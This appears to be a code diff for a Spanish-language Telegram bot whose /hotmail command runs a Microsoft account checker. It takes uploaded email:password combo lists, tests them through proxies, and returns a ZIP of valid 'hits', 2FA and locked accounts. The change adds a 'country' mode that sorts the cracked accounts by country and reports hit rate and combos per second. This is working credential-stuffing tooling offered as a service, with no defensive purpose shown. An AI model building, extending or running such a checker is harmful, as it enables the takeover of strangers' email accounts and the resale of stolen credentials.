@@ -865,12 +865,14 @@ async def _execute_imap_check(event, file_msg, keywords, lang, uid,
 
 
 
-async def _execute_hotmail_check(event, file_msg, proxies_raw, lang, uid):
+async def _execute_hotmail_check(event, file_msg, proxies_raw, lang, uid,
+                                  mode_country=False):
     """Ejecutar Hotmail/Microsoft check con ZIP de resultados.
 
-    Adaptado del script MS Account Checker v3.3 by HacheJota.
-    Genera ZIP con: all_hits.txt, hits.txt, bad_accounts.txt,
-    twofa.txt, locked.txt, unknown.txt, errors.txt, summary.txt
+    Adaptado del script MS Account Checker v4.1 by HacheJota.
+    Genera ZIP con: hits.txt, all_hits.txt, twofa.txt, locked.txt,
+    unknown.txt, errors.txt, summary.txt
+    Si mode_country=True: agrega countries/ con un .txt por país.
     """
     import zipfile
     from datetime import datetime
@@ -960,27 +962,51 @@ async def _execute_hotmail_check(event, file_msg, proxies_raw, lang, uid):
         if stats['hits'] > 0 or stats['twofa'] > 0 or stats['locked'] > 0:
             now_str = datetime.now().strftime('%m/%d/%Y, %I:%M:%S %p')
 
-            # 1) all_hits.txt
+            # 1) all_hits.txt — SOLO mail:pass (sin token ni extras)
             all_hits_path = os.path.join(temp_dir, 'all_hits.txt')
             with open(all_hits_path, 'w', encoding='utf-8') as f:
                 f.write('# HOTMAIL CHECKER RESULTS - ' + now_str + '\n')
                 f.write('# User: ' + str(uid) + ' | Type: hotmail\n\n')
                 for h in hits_data:
-                    tok = h.get("access_token")
-                    if tok:
-                        f.write(f"{h['combo']} | token={tok}\n")
-                    else:
-                        f.write(h['combo'] + '\n')
+                    f.write(h['combo'] + '\n')
 
-            # 2) hits.txt (con tokens)
+            # 2) hits.txt — SOLO mail:pass (sin token)
             hits_path = os.path.join(temp_dir, 'hits.txt')
             with open(hits_path, 'w', encoding='utf-8') as f:
                 for h in hits_data:
-                    tok = h.get("access_token")
-                    if tok:
-                        f.write(f"{h['combo']} | token={tok}\n")
-                    else:
-                        f.write(h['combo'] + '\n')
+                    f.write(h['combo'] + '\n')
+
+            # 2b) countries/ si modo country — un .txt por país (solo mail:pass)
+            countries_dir = None
+            countries_count = 0
+            by_country = {}  # iso -> {name, flag, combos}
+            if mode_country:
+                countries_dir = os.path.join(temp_dir, 'countries')
+                os.makedirs(countries_dir, exist_ok=True)
+
+                # Agrupar hits por ISO de país
+                for h in hits_data:
+                    iso = h.get('iso') or 'Unknown'
+                    if iso not in by_country:
+                        name = h.get('country') or 'Unknown'
+                        flag = h.get('flag') or '🏳️'
+                        by_country[iso] = {'name': name, 'flag': flag, 'combos': []}
+                    by_country[iso]['combos'].append(h['combo'])
+
+                countries_count = len(by_country)
+
+                # Crear un .txt por país
+                for iso, info in by_country.items():
+                    # Nombre de archivo: "<iso>_<name>.txt" (saneado)
+                    safe_name = re.sub(r'[^a-zA-Z0-9_-]', '_', info['name'])[:30]
+                    fname = f"{iso}_{safe_name}.txt"
+                    cpath = os.path.join(countries_dir, fname)
+                    with open(cpath, 'w', encoding='utf-8') as f:
+                        f.write(f"# {info['flag']} {info['name']} ({iso})\n")
+                        f.write(f"# {len(info['combos'])} HITs\n\n")
+                        # Solo mail:pass
+                        for combo in info['combos']:
+                            f.write(combo + '\n')
 
             # 3) twofa.txt
             twofa_path = os.path.join(temp_dir, 'twofa.txt')
@@ -1019,6 +1045,7 @@ async def _execute_hotmail_check(event, file_msg, proxies_raw, lang, uid):
                 f.write('═════════════════════════════════════════\n\n')
                 f.write(f'Date:        {now_str}\n')
                 f.write(f'User ID:     {uid}\n')
+                f.write(f'Mode:        {"country" if mode_country else "default"}\n')
                 f.write(f'Total:       {stats["total"]}\n')
                 f.write(f'HITS:        {stats["hits"]}\n')
                 f.write(f'BAD:         {stats["bads"]}\n')
@@ -1027,10 +1054,27 @@ async def _execute_hotmail_check(event, file_msg, proxies_raw, lang, uid):
                 f.write(f'UNKNOWN:     {stats["unknowns"]}\n')
                 f.write(f'ERRORS:      {stats["errors"]}\n')
                 f.write(f'Elapsed:     {stats["elapsed"]:.1f}s\n')
-                f.write(f'Proxies:     {stats.get("proxies_used", 0)}\n\n')
+                f.write(f'Proxies:     {stats.get("proxies_used", 0)}\n')
+                if mode_country:
+                    f.write(f'Countries:   {countries_count}\n\n')
+                    # Country breakdown en el summary
+                    if countries_count > 0:
+                        f.write('Country breakdown:\n')
+                        # Ordenar por cantidad de hits (desc)
+                        sorted_countries = sorted(
+                            by_country.items(),
+                            key=lambda x: -len(x[1]['combos'])
+                        )
+                        for iso, info in sorted_countries:
+                            f.write(f'  {iso:3s} {info["flag"]} {info["name"][:30]:30s} '
+                                    f'{len(info["combos"])}\n')
+                else:
+                    f.write('\n')
                 f.write('Rate:\n')
-                f.write(f'  HIT rate:  {stats["hits"]/stats["total"]*100:.2f}%\n')
-                f.write(f'  Speed:     {stats["total"]/stats["elapsed"]:.1f} combos/s\n')
+                if stats["total"] > 0:
+                    f.write(f'  HIT rate:  {stats["hits"]/stats["total"]*100:.2f}%\n')
+                    if stats["elapsed"] > 0:
+                        f.write(f'  Speed:     {stats["total"]/stats["elapsed"]:.1f} combos/s\n')
 
             # Empaquetar ZIP
             zip_path = os.path.join(temp_dir, 'hotmail_results.zip')
@@ -1042,6 +1086,11 @@ async def _execute_hotmail_check(event, file_msg, proxies_raw, lang, uid):
                 zf.write(unknown_path, 'unknown.txt')
                 zf.write(errors_path, 'errors.txt')
                 zf.write(summary_path, 'summary.txt')
+                # Agregar countries/ si modo country
+                if countries_dir and os.path.isdir(countries_dir):
+                    for cfn in os.listdir(countries_dir):
+                        zf.write(os.path.join(countries_dir, cfn),
+                                'countries/' + cfn)
 
             # Editar el status_msg a un mensaje breve (sin botones)
             await status_msg.edit(
@@ -1052,15 +1101,25 @@ async def _execute_hotmail_check(event, file_msg, proxies_raw, lang, uid):
             # Enviar el ZIP con el caption combinado elegante (sin botones)
             # Pasamos el PATH (no bytes) para que Telegram muestre el nombre
             # del archivo correctamente — si pasamos bytes, sale "unnamed".
-            await state.bot.send_file(
-                event.chat_id, zip_path,
-                caption=UI.text(
+            if mode_country:
+                caption = UI.text(
+                    "hotmail_zip_caption_country", lang,
+                    stats['total'], stats['hits'], stats['bads'],
+                    stats['twofa'], stats['locked'], stats['unknowns'],
+                    stats['errors'], f"{stats['elapsed']:.1f}s",
+                    stats.get('proxies_used', 0), countries_count
+                )
+            else:
+                caption = UI.text(
                     "hotmail_zip_caption", lang,
                     stats['total'], stats['hits'], stats['bads'],
                     stats['twofa'], stats['locked'], stats['unknowns'],
                     stats['errors'], f"{stats['elapsed']:.1f}s",
                     stats.get('proxies_used', 0)
-                ),
+                )
+            await state.bot.send_file(
+                event.chat_id, zip_path,
+                caption=caption,
                 parse_mode='md',
                 force_document=True
             )
@@ -1762,9 +1821,10 @@ def register_handlers(bot_client):
 
         Uso:
           /hotmail                          → directo (sin proxy)
+          /hotmail country                  → detecta país desde cookie WLSSC
           /hotmail proxy1                   → 1 proxy
+          /hotmail country, http://1.2.3.4  → modo country + proxy
           /hotmail proxy1, proxy2, proxy3   → varios proxies (round-robin)
-          /hotmail p1, p2, p3 respondiendo a un .txt
 
         Formatos de proxy aceptados (cualquiera):
           - http://host:port
@@ -1793,12 +1853,18 @@ def register_handlers(bot_client):
                 parse_mode='md'
             )
 
-        # Parsear proxies del comando
+        # Parsear argumentos del comando
         raw_args = (e.pattern_match.group(1) or "").strip()
+        mode_country = False
         proxies_raw = []
+
         if raw_args:
             # Separar por coma o por espacio
             tokens = [t.strip() for t in raw_args.replace(",", " ").split() if t.strip()]
+            # Detectar 'country' como keyword (no como proxy)
+            if "country" in [t.lower() for t in tokens]:
+                mode_country = True
+                tokens = [t for t in tokens if t.lower() != "country"]
             proxies_raw = tokens
 
         reply = await e.get_reply_message()
@@ -1808,6 +1874,7 @@ def register_handlers(bot_client):
             state.temp_state[uid] = {
                 'step': 'WAITING_HOTMAIL_FILE',
                 'hotmail_proxies': proxies_raw,
+                'hotmail_mode_country': mode_country,
                 'chat_id': e.chat_id
             }
             return await e.reply(
@@ -1824,7 +1891,8 @@ def register_handlers(bot_client):
             )
 
         # Tenemos archivo: ejecutar Hotmail check
-        await _execute_hotmail_check(e, reply, proxies_raw, lang, uid)
+        await _execute_hotmail_check(e, reply, proxies_raw, lang, uid,
+                                      mode_country=mode_country)
 
     # --- Conversación: usuario envía archivo después de poner proxies ---
     @bot_client.on(events.NewMessage(
@@ -1839,7 +1907,9 @@ def register_handlers(bot_client):
         lang = user.get('language', 'es')
         ts = state.temp_state.pop(uid, {})
         proxies_raw = ts.get('hotmail_proxies', [])
-        await _execute_hotmail_check(e, e, proxies_raw, lang, uid)
+        mode_country = ts.get('hotmail_mode_country', False)
+        await _execute_hotmail_check(e, e, proxies_raw, lang, uid,
+                                      mode_country=mode_country)
 
     # --- Si el usuario envía texto (no archivo) mientras espera hotmail file, cancelar ---
     @bot_client.on(events.NewMessage(
@@ -1871,7 +1941,9 @@ def register_handlers(bot_client):
         lang = user.get('language', 'es')
         ts = state.temp_state.pop(uid, {})
         proxies_raw = ts.get('hotmail_proxies', [])
-        await _execute_hotmail_check(e, e, proxies_raw, lang, uid)
+        mode_country = ts.get('hotmail_mode_country', False)
+        await _execute_hotmail_check(e, e, proxies_raw, lang, uid,
+                                      mode_country=mode_country)
 
     # --- BROADCAST ---
 
